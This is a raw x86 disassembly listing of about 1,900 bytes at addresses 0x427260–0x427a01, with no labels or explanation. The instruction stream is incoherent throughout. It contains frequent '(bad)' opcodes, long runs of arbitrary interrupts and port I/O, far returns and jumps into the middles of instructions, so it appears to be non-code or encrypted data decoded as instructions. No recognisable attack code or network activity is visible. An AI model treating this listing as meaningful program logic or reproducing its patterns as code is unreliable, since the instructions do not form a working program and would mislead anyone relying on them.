  427260:	cmp    BYTE PTR [ebx],0xf0
  427263:	shl    edx,cl
  427265:	sub    BYTE PTR [ebx],bh
  427267:	jns    0x42723c
  427269:	mov    ebp,0xcad35392
  42726e:	je     0x4271f5
  427270:	ror    ch,1
  427272:	lea    edx,[ecx]
  427274:	int    0x89
  427276:	int    0x96
  427278:	adc    ebp,ecx
  42727a:	and    bh,BYTE PTR [ebx]
  42727c:	psrlq  mm5,mm3
  42727f:	xchg   edx,eax
  427280:	cmp    ebx,ecx
  427282:	shr    edx,cl
  427284:	sub    BYTE PTR [ebx+0x13],dl
  427287:	retf   0x4d8c
  42728a:	rol    BYTE PTR [edx-0x2d],1
  42728d:	int    0x8d
  42728f:	in     eax,dx
  427290:	int    0x89
  427292:	int    0x96
  427294:	in     eax,dx
  427295:	int    0x22
  427297:	cmp    ecx,DWORD PTR [edi]
  427299:	shr    ebx,cl
  42729b:	xchg   edx,eax
  42729c:	cmp    ebx,ecx
  42729e:	shr    edx,cl
  4272a0:	sub    BYTE PTR [ebx+0x13],dl
  4272a3:	retf   0x4d8c
  4272a6:	ror    BYTE PTR [edx-0x2d],1
  4272a9:	int    0x8d
  4272ab:	adc    ebp,ecx
  4272ad:	mov    ebp,ecx
  4272af:	xchg   esi,eax
  4272b0:	adc    ebp,ecx
  4272b2:	and    bh,BYTE PTR [ebx]
  4272b4:	(bad)  
  4272b6:	(bad)  
  4272b8:	jmp    0x42724c
  4272ba:	shr    edx,cl
  4272bc:	sub    BYTE PTR [ebx+0x13],dl
  4272bf:	retf   0x4d8c
  4272c2:	push   ebp
  4272c3:	pusha  
  4272c4:	jge    0x4272f5
  4272c6:	push   es
  4272c7:	cmc    
  4272c8:	add    BYTE PTR [eax-0x12893280],0xcd
  4272cf:	(bad)  
  4272d0:	in     eax,dx
  4272d1:	int    0x89
  4272d3:	int    0x80
  4272d5:	cmp    esi,eax
  4272d7:	shl    edx,cl
  4272d9:	sub    BYTE PTR [ebx],bh
  4272db:	jns    0x4272b0
  4272dd:	mov    ebp,0xcad35392
  4272e2:	je     0x427269
  4272e4:	ror    ch,1
  4272e6:	lea    edx,[ecx*8+0x1496cd89]
  4272ed:	int    0x22
  4272ef:	cmp    ecx,DWORD PTR [edi]
  4272f1:	shr    ebx,cl
  4272f3:	xchg   edx,eax
  4272f4:	cmp    ebx,ecx
  4272f6:	shr    edx,cl
  4272f8:	sub    BYTE PTR [ebx+0x13],dl
  4272fb:	retf   0x4d8c
  4272fe:	rol    BYTE PTR [edx-0x2d],1
  427301:	int    0x8d
  427303:	cmc    
  427304:	int    0x89
  427306:	int    0x96
  427308:	cmc    
  427309:	int    0x22
  42730b:	cmp    ecx,DWORD PTR [edi]
  42730d:	shr    ebx,cl
  42730f:	xchg   edx,eax
  427310:	cmp    ebx,ecx
  427312:	shr    edx,cl
  427314:	sub    BYTE PTR [ebx+0x13],dl
  427317:	retf   0x4d8c
  42731a:	ror    BYTE PTR [edx-0x2d],1
  42731d:	int    0x8d
  42731f:	adc    al,0xcd
  427321:	mov    ebp,ecx
  427323:	xchg   esi,eax
  427324:	adc    al,0xcd
  427326:	and    bh,BYTE PTR [ebx]
  427328:	(bad)  
  42732a:	(bad)  
  42732c:	jmp    0x4272c0
  42732e:	shr    edx,cl
  427330:	sub    BYTE PTR [ebx+0x13],dl
  427333:	retf   0x4d8c
  427336:	push   ebp
  427337:	pusha  
  427338:	jge    0x427369
  42733a:	push   es
  42733b:	add    DWORD PTR [eax+0x76cd8080],eax
  427341:	in     eax,dx
  427342:	int    0x8d
  427344:	in     eax,dx
  427345:	int    0x89
  427347:	int    0x80
  427349:	cmp    esi,eax
  42734b:	shl    edx,cl
  42734d:	sub    BYTE PTR [ebx],bh
  42734f:	jns    0x427324
  427351:	mov    ebp,0xcad35392
  427356:	je     0x4272dd
  427358:	ror    ch,1
  42735a:	(bad)  
  42735b:	cmc    
  42735c:	int    0x89
  42735e:	int    0x96
  427360:	cmc    
  427361:	int    0x22
  427363:	cmp    ecx,DWORD PTR [edi]
  427365:	shr    ebx,cl
  427367:	xchg   edx,eax
  427368:	cmp    ebx,ecx
  42736a:	shr    edx,cl
  42736c:	sub    BYTE PTR [ebx+0x13],dl
  42736f:	retf   0x4d8c
  427372:	rol    BYTE PTR [edx-0x2d],1
  427375:	int    0x8d
  427377:	adc    ebp,ecx
  427379:	mov    ebp,ecx
  42737b:	xchg   esi,eax
  42737c:	adc    ebp,ecx
  42737e:	and    bh,BYTE PTR [ebx]
  427380:	psrlq  mm5,mm3
  427383:	xchg   edx,eax
  427384:	cmp    ebx,ecx
  427386:	shr    edx,cl
  427388:	sub    BYTE PTR [ebx+0x13],dl
  42738b:	retf   0x4d8c
  42738e:	ror    BYTE PTR [edx-0x2d],1
  427391:	int    0x8d
  427393:	in     eax,dx
  427394:	int    0x89
  427396:	int    0x96
  427398:	in     eax,dx
  427399:	int    0x22
  42739b:	cmp    ecx,DWORD PTR [edi]
  42739d:	cmp    ebx,ecx
  42739f:	shr    ebx,cl
  4273a1:	xchg   edx,eax
  4273a2:	shr    edx,cl
  4273a4:	sub    BYTE PTR [ebx+0x13],dl
  4273a7:	retf   0x4d8c
  4273aa:	push   ebp
  4273ab:	pusha  
  4273ac:	jge    0x427384
  4273ae:	xor    bh,cl
  4273b0:	jbe    0x427382
  4273b2:	jo     0x427371
  4273b4:	outs   dx,DWORD PTR ds:[esi]
  4273b5:	lods   eax,DWORD PTR ds:[esi]
  4273b6:	add    BYTE PTR [eax],al
  4273b8:	int    0x8d
  4273ba:	pop    ebp
  4273bb:	inc    ebx
  4273bc:	rcl    esp,cl
  4273be:	push   ss
  4273bf:	int    0x76
  4273c1:	std    
  4273c2:	int    0x8d
  4273c4:	std    
  4273c5:	cmp    esi,eax
  4273c7:	cmp    edi,DWORD PTR [ecx-0x2d]
  4273ca:	repnz sub bl,dl
  4273cd:	mov    ebp,0xad35392
  4273d2:	jbe    0x427381
  4273d4:	int    0x76
  4273d6:	stc    
  4273d7:	int    0xa6
  4273d9:	stc    
  4273da:	int    0x76
  4273dc:	stc    
  4273dd:	int    0x8d
  4273df:	stc    
  4273e0:	cmp    ebp,DWORD PTR [ecx-0x132c36c5]
  4273e6:	xchg   edx,eax
  4273e7:	shr    DWORD PTR [ebp-0x7862acd8],cl
  4273ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4273ee:	gs int 0x76
  4273f1:	xchg   ebp,eax
  4273f2:	cmp    ecx,DWORD PTR [edi]
  4273f4:	add    al,0xf2
  4273f6:	std    
  4273f7:	add    al,0xad
  4273f9:	std    
  4273fa:	shr    esp,cl
  4273fc:	sub    BYTE PTR [edi+0x12db537d],al
  427402:	hlt    
  427403:	dec    ecx
  427404:	and    DWORD PTR [esi-0x28932cb],eax
  42740a:	int    0x8d
  42740c:	std    
  42740d:	cmp    esi,eax
  42740f:	cmp    edi,DWORD PTR [ecx-0x2d]
  427412:	repnz sub bl,dl
  427415:	mov    ebp,0xcdd35392
  42741a:	lea    ebp,[ebp+0x52f7d43]
  427420:	push   ds
  427421:	std    
  427422:	add    BYTE PTR [eax],al
  427424:	int    0x76
  427426:	std    
  427427:	int    0x8d
  427429:	std    
  42742a:	cmp    edi,DWORD PTR [ecx+0x3b]
  42742d:	lock shl edx,cl
  427430:	sub    bl,dl
  427432:	mov    ebp,0xcdd35392
  427437:	lea    ebp,[ebp+0x1ad67d43]
  42743d:	int    0x76
  42743f:	stc    
  427440:	int    0x8d
  427442:	stc    
  427443:	cmp    edi,DWORD PTR [ecx+0x3b]
  427446:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  42744d:	push   ebx
  42744e:	shr    ebx,cl
  427450:	jle    0x4273d3
  427452:	add    BYTE PTR [eax+0x5b6324c0],0x0
  427459:	(bad)  
  42745a:	popf   
  42745b:	iret   
  42745c:	jbe    0x427473
  42745e:	jo     0x42741d
  427460:	jge    0x42743d
  427462:	add    BYTE PTR [eax],al
  427464:	int    0x76
  427466:	std    
  427467:	int    0x8d
  427469:	std    
  42746a:	cmp    edi,DWORD PTR [ecx+0x3b]
  42746d:	lock shl edx,cl
  427470:	sub    bl,dl
  427472:	mov    ebp,0xcdd35392
  427477:	lea    esp,[ebp+0x5bd4d343]
  42747d:	int    0x76
  42747f:	stc    
  427480:	int    0x8d
  427482:	stc    
  427483:	cmp    edi,DWORD PTR [ecx+0x3b]
  427486:	lock shl edx,cl
  427489:	sub    bl,dl
  42748b:	mov    ebp,0xcdd35392
  427490:	lea    esp,[ebp+0x26d4d343]
  427496:	int    0x76
  427498:	stc    
  427499:	int    0x8d
  42749b:	stc    
  42749c:	cmp    edi,DWORD PTR [ecx+0x3b]
  42749f:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4274a6:	push   ebx
  4274a7:	shl    DWORD PTR [eax+0x5b],cl
  4274aa:	iret   
  4274ab:	jbe    0x4274c2
  4274ad:	jo     0x42746c
  4274af:	das    
  4274b0:	cli    
  4274b1:	add    BYTE PTR [eax],al
  4274b3:	int    0x76
  4274b5:	std    
  4274b6:	int    0x8d
  4274b8:	std    
  4274b9:	cmp    edi,DWORD PTR [ecx+0x3b]
  4274bc:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4274c3:	push   ebx
  4274c4:	shl    DWORD PTR [eax+0x5b],cl
  4274c7:	iret   
  4274c8:	jbe    0x4274df
  4274ca:	jo     0x427489
  4274cc:	sti    
  4274cd:	stc    
  4274ce:	add    BYTE PTR [eax],al
  4274d0:	int    0x76
  4274d2:	popf   
  4274d3:	xchg   ebp,eax
  4274d5:	or     dh,BYTE PTR [esi+0x14]
  4274d8:	add    dh,dl
  4274da:	cmp    eax,0xcd14d600
  4274df:	jbe    0x427516
  4274e1:	xchg   DWORD PTR [esi-0x78],esi
  4274e4:	jo     0x4274a3
  4274e6:	push   edx
  4274e7:	fild   DWORD PTR [eax]
  4274e9:	add    ch,cl
  4274eb:	jbe    0x4274ea
  4274ed:	int    0x8d
  4274ef:	std    
  4274f0:	cmp    edi,DWORD PTR [ecx+0x3b]
  4274f3:	lock shl edx,cl
  4274f6:	sub    bl,dl
  4274f8:	mov    ebp,0xcdd35392
  4274fd:	lea    esp,[ebp-0x592b2cbd]
  427503:	int    0x76
  427505:	stc    
  427506:	int    0x8d
  427508:	stc    
  427509:	cmp    edi,DWORD PTR [ecx+0x3b]
  42750c:	lock shl edx,cl
  42750f:	sub    bl,dl
  427511:	mov    ebp,0xcdd35392
  427516:	lea    esp,[ebp+0x32d4d343]
  42751c:	int    0x76
  42751e:	stc    
  42751f:	int    0x8d
  427521:	stc    
  427522:	cmp    edi,DWORD PTR [ecx-0x2d]
  427525:	mov    ebp,0xd3f03b92
  42752a:	repnz sub BYTE PTR [ebx-0x2d],dl
  42752e:	jo     0x427530
  427530:	(bad)  
  427531:	cmp    eax,0x873576cd
  427536:	jbe    0x4274c0
  427538:	jo     0x4274f7
  42753a:	add    eax,0xcd0000f9
  42753f:	jbe    0x42753e
  427541:	int    0x8d
  427543:	std    
  427544:	cmp    edi,DWORD PTR [ecx-0x2d]
  427547:	mov    ebp,0xd3f03b92
  42754c:	repnz sub BYTE PTR [ebx-0x2d],dl
  427550:	jo     0x427552
  427552:	(bad)  
  427553:	cmp    eax,0x873576cd
  427558:	jbe    0x4274e2
  42755a:	jo     0x427519
  42755c:	jb     0x427557
  42755e:	add    BYTE PTR [eax],al
  427560:	int    0x8d
  427562:	inc    ebp
  427563:	int    0x76
  427565:	inc    ebp
  427566:	cmp    ecx,ecx
  427568:	cmp    ecx,DWORD PTR [edi]
  42756a:	shr    ebx,cl
  42756c:	xchg   edx,eax
  42756d:	shr    DWORD PTR [ebp-0x322cacd8],cl
  427573:	lea    ebp,ds:0x803fd33b
  427579:	add    DWORD PTR [eax+0x3614d480],0x80800180
  427583:	jo     0x427585
  427585:	(bad)  
  427586:	cmp    eax,0x87358dcd
  42758b:	lea    ecx,[eax+0xa95abd]
  427591:	add    ch,cl
  427593:	jbe    0x4275c5
  427595:	int    0x8d
  427597:	cmp    eax,0x76cd8881
  42759c:	cmp    eax,0xabd7687
  4275a1:	jbe    0x427560
  4275a3:	int    0x76
  4275a5:	stc    
  4275a6:	int    0x8d
  4275a8:	stc    
  4275a9:	cmp    esi,eax
  4275ab:	shl    edx,cl
  4275ad:	sub    BYTE PTR [ebx],bh
  4275af:	jns    0x427584
  4275b1:	mov    ebp,0xcdd35392
  4275b6:	lea    edi,[ebp-0x322c2ed1]
  4275bc:	(bad)  
  4275bd:	std    
  4275be:	int    0x96
  4275c0:	std    
  4275c1:	cmp    ecx,DWORD PTR [edi]
  4275c3:	cmp    ebx,ecx
  4275c5:	shr    ebx,cl
  4275c7:	xchg   edx,eax
  4275c8:	shr    edx,cl
  4275ca:	sub    BYTE PTR [ebx+0x13],dl
  4275cd:	xchg   DWORD PTR [ebp+0x2fd343f1],ecx
  4275d3:	or     edi,DWORD PTR [ecx]
  4275d5:	cli    
  4275d6:	add    BYTE PTR [eax],al
  4275d8:	int    0x76
  4275da:	mov    BYTE PTR [edx-0x2d349c58],ch
  4275e0:	xor    BYTE PTR [eax+0x4edcd96],al
  4275e6:	in     eax,dx
  4275e7:	adc    al,0x5b
  4275e9:	cwde   
  4275ea:	call   0xcd34:0x76cd6d3b
  4275f1:	add    DWORD PTR ds:0xcd808081,ebp
  4275f7:	xchg   esi,eax
  4275f8:	mov    ch,cl
  4275fa:	or     ch,0xd6
  4275fd:	dec    esp
  4275fe:	int    0xe6
  427600:	mov    ch,cl
  427602:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427603:	dec    esp
  427604:	or     dh,BYTE PTR [esi-0x3]
  427607:	pop    edi
  427608:	jnp    0x427641
  42760a:	ficom  WORD PTR [ebx]
  42760c:	cmp    esp,ebx
  42760e:	pop    ebp
  42760f:	mov    ebp,0x3b25230a
  427614:	adc    DWORD PTR [edi],ebp
  427616:	inc    ebp
  427617:	sti    
  427618:	xchg   edx,eax
  427619:	shr    ecx,cl
  42761b:	sub    BYTE PTR [edx],dl
  42761d:	clc    
  42761e:	add    BYTE PTR [eax-0x102c9380],0x92
  427625:	cmp    ebx,ebp
  427627:	push   ebx
  427628:	clc    
  427629:	int    0xe6
  42762b:	sbb    al,0x53
  42762d:	aad    0x43
  42762f:	(bad)  
  427631:	sbb    eax,DWORD PTR [ebx-0xc]
  427634:	(bad)  
  427635:	das    
  427636:	adc    cl,BYTE PTR [ebp+0x59]
  427639:	je     0x4275e5
  42763b:	push   edi
  42763c:	ja     0x427603
  42763e:	xchg   edi,eax
  42763f:	shr    ebx,0xd9
  427642:	add    DWORD PTR [eax+0x3096cd80],0xcd14d6cd
  42764c:	xchg   esi,eax
  42764d:	mov    ch,cl
  42764f:	(bad)  
  427650:	dec    esp
  427651:	int    0x96
  427653:	mov    ch,cl
  427655:	(bad)  
  427656:	dec    esp
  427657:	int    0xe6
  427659:	mov    ch,cl
  42765b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42765c:	dec    esp
  42765d:	cmp    edx,DWORD PTR [ecx]
  42765f:	cmp    esp,ebx
  427661:	das    
  427662:	inc    ebp
  427663:	sti    
  427664:	xchg   edx,eax
  427665:	shr    ecx,cl
  427667:	sub    BYTE PTR [edx],dl
  427669:	clc    
  42766a:	add    BYTE PTR [eax-0x22c49380],0x53
  427671:	aad    0xd3
  427673:	out    dx,eax
  427674:	xchg   edx,eax
  427675:	push   ebx
  427676:	clc    
  427677:	int    0xe6
  427679:	xor    ch,cl
  42767b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42767c:	adc    al,0x3b
  42767e:	popf   
  42767f:	int    0x76
  427681:	xor    BYTE PTR [ebx],bh
  427683:	cli    
  427684:	int    0x8d
  427686:	adc    al,0x2f
  427688:	inc    ebp
  427689:	loope  0x42761d
  42768b:	shr    DWORD PTR [ebp+0x53cb3b28],cl
  427691:	cli    
  427692:	push   esi
  427693:	add    BYTE PTR [eax-0x132c9380],0x92
  42769a:	push   ebx
  42769b:	popf   
  42769c:	int    0x76
  42769e:	mov    BYTE PTR [edi-0x320be427],al
  4276a4:	bswap  ebp
  4276a6:	(bad)  
  4276a7:	dec    esp
  4276a8:	int    0xe6
  4276aa:	xor    ch,cl
  4276ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4276ad:	adc    al,0x4
  4276af:	lods   eax,DWORD PTR ds:[esi]
  4276b0:	std    
  4276b1:	add    al,0xe9
  4276b3:	std    
  4276b4:	shr    ebx,cl
  4276b6:	sub    BYTE PTR [ebx],bh
  4276b8:	ficom  DWORD PTR [esi-0x2c]
  4276bb:	aaa    
  4276bc:	ficom  WORD PTR [ebx]
  4276be:	adc    dh,bh
  4276c0:	mov    ebp,0x1225230a
  4276c5:	clc    
  4276c6:	aam    0x37
  4276c8:	ficom  WORD PTR [ebx]
  4276ca:	adc    dh,ah
  4276cc:	mov    ebp,0x8725230a
  4276d1:	leave  
  4276d2:	sbb    esi,esp
  4276d4:	push   ebx
  4276d5:	jge    0x42772a
  4276d7:	cdq    
  4276d8:	pop    ebp
  4276d9:	mov    ebp,0x1225230a
  4276de:	add    dl,dh
  4276e0:	aaa    
  4276e1:	ficom  WORD PTR [ebx]
  4276e3:	cmp    esi,ecx
  4276e5:	adc    bh,dl
  4276e7:	out    0x37,al
  4276e9:	ficom  WORD PTR [ebx]
  4276eb:	(bad)  
  4276ec:	sbb    eax,DWORD PTR [ebx-0xf]
  4276ef:	(bad)  
  4276f0:	das    
  4276f1:	adc    dl,BYTE PTR [esi-0x1]
  4276f4:	das    
  4276f5:	stos   DWORD PTR es:[edi],eax
  4276f6:	push   es
  4276f7:	in     eax,0x9b
  4276f9:	xchg   edi,eax
  4276fa:	imul   bl
  4276fc:	and    al,0x81
  4276fe:	add    BYTE PTR [eax-0x32776933],0xd6
  427705:	dec    esp
  427706:	int    0xa6
  427708:	mov    ch,cl
  42770a:	out    0x4c,al
  42770c:	cmp    edx,DWORD PTR [ecx]
  42770e:	pop    edi
  42770f:	jnp    0x427748
  427711:	ficom  WORD PTR [ebx]
  427713:	cmp    esp,ebx
  427715:	das    
  427716:	inc    ebp
  427717:	sti    
  427718:	xchg   edx,eax
  427719:	shr    edi,cl
  42771b:	xchg   edx,eax
  42771c:	cmp    eax,DWORD PTR [eax]
  42771e:	shl    ebp,cl
  427720:	sub    BYTE PTR [edx],cl
  427722:	(bad)  
  427723:	cmc    
  427724:	push   ebx
  427725:	fxch   st(5)
  427727:	out    0xf5,al
  427729:	imul   eax,DWORD PTR [eax+0x3b6c8080],0xcdfc53a9
  427733:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427734:	and    al,0xcd
  427736:	and    ecx,DWORD PTR [edx]
  427738:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427739:	adc    DWORD PTR [ebx-0x1e],eax
  42773c:	(bad)  
  42773d:	xchg   BYTE PTR [ebx],bh
  42773f:	fiadd  DWORD PTR [ebx-0x27]
  427742:	aam    0x20
  427744:	add    dh,dl
  427746:	xor    al,0xcd
  427748:	(bad)  
  427749:	and    al,0x0
  42774b:	(bad)  
  42774c:	sub    al,0x0
  42774e:	(bad)  
  42774f:	std    
  427750:	add    BYTE PTR [eax-0x43],bl
  427753:	sub    edi,eax
  427755:	add    BYTE PTR [eax],al
  427757:	or     al,BYTE PTR [esi-0x7f7f9615]
  42775d:	or     ch,0x96
  427760:	mov    ch,cl
  427762:	out    0x4c,al
  427764:	cmp    edi,ecx
  427766:	cmp    esp,ebx
  427768:	das    
  427769:	inc    ebp
  42776a:	add    edx,DWORD PTR [edx+0xa9210d3]
  427770:	out    0xf5,al
  427772:	int    0xe6
  427774:	mov    ch,cl
  427776:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427777:	dec    esp
  427778:	shr    ecx,cl
  42777a:	sub    BYTE PTR [ebx],bh
  42777c:	dec    ebp
  42777e:	(bad)  
  42777f:	cmc    
  427780:	cmp    ebx,ebp
  427782:	push   ebx
  427783:	clc    
  427784:	int    0xe6
  427786:	xor    BYTE PTR [ebx],bh
  427788:	cli    
  427789:	push   ebx
  42778a:	aad    0xcd
  42778c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42778d:	adc    al,0x3b
  42778f:	popf   
  427790:	int    0xc9
  427792:	int    0xe6
  427794:	xor    ch,cl
  427796:	or     al,0xcd
  427798:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427799:	adc    al,0x2f
  42779b:	inc    ebp
  42779c:	jge    0x427730
  42779e:	shr    ecx,cl
  4277a0:	sub    BYTE PTR [ebx],bh
  4277a2:	fst    st(3)
  4277a4:	jmp    0x427738
  4277a6:	adc    bh,al
  4277a8:	add    BYTE PTR [eax-0x3aac9380],0x53
  4277af:	lock inc ebx
  4277b1:	icebp  
  4277b2:	(bad)  
  4277b3:	sbb    BYTE PTR [ebx+0x2],al
  4277b6:	(bad)  
  4277b7:	and    dh,BYTE PTR [ecx+0x761dfc3b]
  4277bd:	mov    esi,0xdd8bf56d
  4277c2:	(bad)  
  4277c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4277c4:	cmp    edi,esp
  4277c6:	sbb    eax,0xcd62ec76
  4277cb:	jbe    0x427755
  4277cd:	int    0x8d
  4277cf:	dec    esp
  4277d0:	int    0x96
  4277d2:	mov    ch,cl
  4277d4:	(bad)  
  4277d5:	dec    esp
  4277d6:	adc    al,BYTE PTR [edx]
  4277d8:	mov    ebp,0x5625230a
  4277dd:	jnp    0x427816
  4277df:	ficom  WORD PTR [ebx]
  4277e1:	das    
  4277e2:	inc    ebp
  4277e3:	jge    0x427777
  4277e5:	int    0xfb
  4277e7:	cmp    eax,DWORD PTR [eax]
  4277e9:	cmp    ebx,edx
  4277eb:	sar    DWORD PTR [ecx-0x2cfcc4d8],cl
  4277f1:	jmp    0x427785
  4277f3:	adc    dh,bh
  4277f5:	add    BYTE PTR [eax-0x36ac9380],0x53
  4277fc:	divps  xmm6,XMMWORD PTR [esi-0x3]
  427800:	(bad)  
  427801:	test   BYTE PTR [ebx-0x1d],al
  427804:	aam    0x4c
  427806:	adc    al,BYTE PTR [esi-0x3e]
  427809:	gs sub al,0x1
  42780c:	jo     0x427848
  42780e:	mov    edx,0x124aece0
  427813:	ss inc edx
  427815:	das    
  427816:	sbb    edx,esi
  427818:	mov    ebx,0xaa029f75
  42781d:	test   al,0x63
  42781f:	retf   
  427820:	shr    BYTE PTR [eax+eax*4],cl
  427823:	xchg   esi,eax
  427824:	int    0xed
  427826:	add    al,0xed
  427828:	dec    esp
  427829:	int    0x76
  42782b:	mov    ch,cl
  42782d:	lea    ecx,[edi+ebp*1+0x45]
  427831:	jge    0x4277c5
  427833:	shr    ebx,cl
  427835:	xchg   edx,eax
  427836:	int    0x8d
  427838:	mov    ch,cl
  42783a:	xchg   esi,eax
  42783b:	dec    esp
  42783c:	cwde   
  42783d:	shl    edx,cl
  42783f:	sub    ch,cl
  427841:	lea    ebx,[ecx+ebp*2]
  427844:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427845:	mov    esi,0x793b4229
  42784a:	cmp    ebx,edx
  42784c:	push   ebx
  42784d:	ror    BYTE PTR [edx],cl
  42784f:	or     ebp,0x1cd2476
  427855:	xor    eax,0xcd808081
  42785a:	mov    ch,cl
  42785c:	jbe    0x427882
  42785e:	int    0x1
  427860:	xor    eax,0xcd808081
  427865:	add    BYTE PTR [edi-0x72329b92],0x24
  42786c:	int    0xa
  42786e:	adc    DWORD PTR [ecx+0x7ecd8080],eax
  427874:	adc    al,0xc0
  427876:	test   BYTE PTR [eax+eax*4+0x808050],bh
  42787d:	nop
  42787e:	jo     0x4278e2
  427880:	add    bl,ah
  427882:	or     cl,BYTE PTR [ebx-0x32778933]
  427888:	lea    ecx,[edi+ebp*1+0x45]
  42788c:	jge    0x427820
  42788e:	shr    ebx,cl
  427890:	xchg   edx,eax
  427891:	int    0x8d
  427893:	mov    ch,cl
  427895:	xchg   esi,eax
  427896:	dec    esp
  427897:	add    dh,dl
  427899:	and    al,0x3b
  42789b:	jns    0x4278d8
  42789d:	ficom  DWORD PTR [ebx-0x2e]
  4278a0:	or     dh,BYTE PTR [esi-0x3]
  4278a3:	iret   
  4278a4:	jbe    0x4278a3
  4278a6:	jo     0x427842
  4278a8:	add    dh,dl
  4278aa:	sbb    al,0xd3
  4278ac:	repnz sub BYTE PTR [eax],al
  4278af:	(bad)  
  4278b0:	adc    al,0x0
  4278b2:	(bad)  
  4278b3:	xor    BYTE PTR [eax],al
  4278b5:	(bad)  
  4278b6:	dec    esp
  4278b7:	add    dh,dl
  4278b9:	mov    BYTE PTR [ebp+0xfe2b],bh
  4278bf:	int    0x76
  4278c1:	mov    ch,cl
  4278c3:	lea    ecx,[edi+ebp*1+0x45]
  4278c7:	jge    0x42785b
  4278c9:	shr    ebx,cl
  4278cb:	xchg   edx,eax
  4278cc:	int    0x8d
  4278ce:	mov    ch,cl
  4278d0:	xchg   esi,eax
  4278d1:	dec    esp
  4278d2:	cmp    edi,DWORD PTR [ecx+0x3b]
  4278d5:	fcmovbe st,st(3)
  4278d7:	repnz sub ch,cl
  4278da:	das    
  4278db:	push   ebx
  4278dc:	rol    BYTE PTR [ebx+0x7d],cl
  4278df:	aam    0x36
  4278e1:	int    0x76
  4278e3:	xor    ch,cl
  4278e5:	lea    edx,[edi+ebp*1]
  4278e8:	inc    ebp
  4278e9:	jge    0x42787d
  4278eb:	shr    ebx,cl
  4278ed:	xchg   edx,eax
  4278ee:	int    0x8d
  4278f0:	xor    ch,cl
  4278f2:	xchg   esi,eax
  4278f3:	adc    al,0x3b
  4278f5:	jns    0x427932
  4278f7:	fcmovbe st,st(3)
  4278f9:	repnz sub ch,cl
  4278fc:	lea    ebx,[ebx+edx*2]
  4278ff:	shr    BYTE PTR [edi],cl
  427901:	shl    DWORD PTR [esi-0x3],1
  427904:	or     al,BYTE PTR [ecx+0x1cd2cba8]
  42790a:	adc    BYTE PTR [esi+0x5b71edcd],0x98
  427911:	call   0xcd3c:0xd6cd6d3b
  427918:	xchg   esi,eax
  427919:	inc    esp
  42791a:	int    0xe6
  42791c:	and    al,0x5d
  42791e:	mov    ebp,0x5f25230a
  427923:	jnp    0x42795c
  427925:	ficom  WORD PTR [ebx]
  427927:	inc    ebx
  427928:	icebp  
  427929:	das    
  42792a:	or     BYTE PTR [edi],al
  42792c:	add    BYTE PTR [eax-0x4613080],0x82
  427933:	test   BYTE PTR [ebx-0xc],al
  427936:	jnp    0x42791e
  427938:	inc    ebx
  427939:	hlt    
  42793a:	(bad)  
  42793b:	mov    BYTE PTR [ebx-0xf],al
  42793e:	das    
  42793f:	add    eax,0x80809216
  427944:	adc    bh,bh
  427946:	jno    0x42797f
  427948:	ficom  WORD PTR [ebx]
  42794a:	(bad)  
  42794b:	mov    BYTE PTR [ebx-0xf],al
  42794e:	das    
  42794f:	add    eax,0x80809285
  427954:	adc    bh,bh
  427956:	xchg   esi,eax
  427957:	aaa    
  427958:	ficom  WORD PTR [ebx]
  42795a:	(bad)  
  42795b:	mov    BYTE PTR [ebx-0xf],al
  42795e:	das    
  42795f:	add    eax,0x808080f8
  427964:	adc    bh,bh
  427966:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427967:	aaa    
  427968:	ficom  WORD PTR [ebx]
  42796a:	(bad)  
  42796b:	test   BYTE PTR [ebx-0xf],al
  42796e:	aam    0x3e
  427970:	adc    bh,bh
  427972:	scas   al,BYTE PTR es:[edi]
  427973:	aaa    
  427974:	ficom  WORD PTR [ebx]
  427976:	(bad)  
  427977:	mov    BYTE PTR [ebx-0xf],al
  42797a:	das    
  42797b:	add    eax,0x808081db
  427980:	adc    bh,bh
  427982:	mov    dh,0x37
  427984:	ficom  WORD PTR [ebx]
  427986:	das    
  427987:	push   es
  427988:	into   
  427989:	add    DWORD PTR [eax+0x2ff14380],0x80809f05
  427993:	sub    bl,0x12
  427996:	add    DWORD PTR [eax+0x1cd60080],0x2cd600
  4279a0:	(bad)  
  4279a1:	adc    al,0x0
  4279a3:	(bad)  
  4279a4:	xor    BYTE PTR [eax],al
  4279a6:	(bad)  
  4279a7:	dec    esp
  4279a8:	add    dh,dl
  4279aa:	mov    BYTE PTR [ebp+0xff77],bh
  4279b0:	jmp    0x427968
  4279b2:	add    DWORD PTR [eax-0x3900ed80],0xd613de37
  4279bc:	mov    BYTE PTR [ebx-0xf],al
  4279bf:	das    
  4279c0:	add    eax,0x80808019
  4279c5:	adc    bh,bh
  4279c7:	xchg   ecx,eax
  4279c8:	aaa    
  4279c9:	ficom  WORD PTR [ebx]
  4279cb:	(bad)  
  4279cc:	mov    BYTE PTR [ebx-0xf],al
  4279cf:	das    
  4279d0:	add    eax,0x8080818e
  4279d5:	adc    bh,bh
  4279d7:	(bad)  
  4279d8:	aaa    
  4279d9:	ficom  WORD PTR [ebx]
  4279db:	(bad)  
  4279dc:	test   BYTE PTR [ebx-0xf],al
  4279df:	aam    0x1c
  4279e1:	adc    bh,bh
  4279e3:	fidiv  WORD PTR [edi]
  4279e5:	ficom  WORD PTR [ebx]
  4279e7:	(bad)  
  4279e8:	mov    BYTE PTR [ebx-0xf],al
  4279eb:	das    
  4279ec:	add    eax,0x80808142
  4279f1:	adc    bh,bh
  4279f3:	out    0x37,al
  4279f5:	ficom  WORD PTR [ebx]
  4279f7:	in     al,dx
  4279f8:	iret   
  4279f9:	int    0x96
  4279fb:	mov    ch,cl
  4279fd:	(bad)  
  4279fe:	dec    esp
  4279ff:	int    0xe6
  427a01:	mov    ch,cl
